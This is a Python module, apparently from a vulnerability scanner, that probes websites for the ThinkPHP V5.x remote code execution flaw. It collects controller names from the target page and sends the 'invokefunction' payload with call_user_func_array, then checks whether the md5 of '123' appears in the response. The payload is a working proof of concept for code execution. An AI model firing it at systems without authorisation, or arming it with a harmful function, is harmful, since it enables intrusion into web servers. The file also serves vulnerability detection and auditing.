#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ThinkPHP V5代码执行漏洞
referer: https://iaq.pw/archives/106
author: Ascotbe
reference: Lucifer
description: ThinkPHP V5.x代码执行漏洞
'''
import urllib
import requests
import re
def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


def extract_controller( url):
    urls = list()
    req = requests.get(url, timeout=10, verify=False)
    pattern = '<a[\\s+]href="/[A-Za-z]+'
    matches = re.findall(pattern, req.text)
    for match in matches:
        urls.append(match.split('/')[1])
    urls = list(set(urls))
    urls.append('index')
    return urls
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global resp
    global resp2

    try:
        payload_urlx = scheme + "://" + url
        controllers = extract_controller(payload_urlx)
        for controller in controllers:
            payload = "/?s={}/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=123".format(
                controller)
            payload_url = scheme + "://" + url + payload
            headers = {
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'User-Agent': RandomAgent,
            }
            #s = requests.session()
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if  con.lower().find('202cb962ac59075b964b07152d234b70')!=-1:
                Medusa = "{} 存在ThinkPHP 代码执行漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass